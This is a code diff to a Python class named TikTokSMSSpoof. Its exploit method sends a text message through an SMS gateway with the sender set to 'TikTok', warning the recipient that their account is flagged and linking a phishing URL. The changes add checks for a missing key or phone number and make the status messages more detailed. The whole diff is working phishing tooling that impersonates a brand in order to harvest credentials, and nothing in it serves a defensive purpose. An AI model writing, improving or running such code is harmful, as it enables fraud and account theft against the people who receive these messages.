@@ -8,15 +8,17 @@ class TikTokSMSSpoof:
 
     def exploit(self, phone, phishing_url):
         if not self.api_key:
-            return {'success': False, 'output': 'No SMS API key'}
-        msg = f"TikTok: Your account is flagged. Verify here: {phishing_url}"
+            return {'success': False, 'output': 'SMS gateway API key not set. Skipping SMS spoof.'}
+        if not phone:
+            return {'success': False, 'output': 'No phone number provided.'}
+        msg = f"TikTok Security Alert: Your account was flagged. Verify here: {phishing_url}"
         payload = {'to': phone, 'from': 'TikTok', 'message': msg}
         headers = {'Authorization': f'Bearer {self.api_key}'}
         try:
             resp = requests.post(self.gateway_url, json=payload, headers=headers, timeout=30)
             if resp.status_code == 200:
-                return {'success': True, 'output': f'Spoofed SMS sent to {phone}'}
+                return {'success': True, 'output': f'Spoofed SMS sent to {phone} via {self.gateway_url}'}
             else:
-                return {'success': False, 'output': f'Gateway error: {resp.text[:200]}'}
+                return {'success': False, 'output': f'Gateway error: {resp.status_code} – {resp.text[:200]}'}
         except Exception as e:
-            return {'success': False, 'output': str(e)}
+            return {'success': False, 'output': f'Error: {str(e)}'}
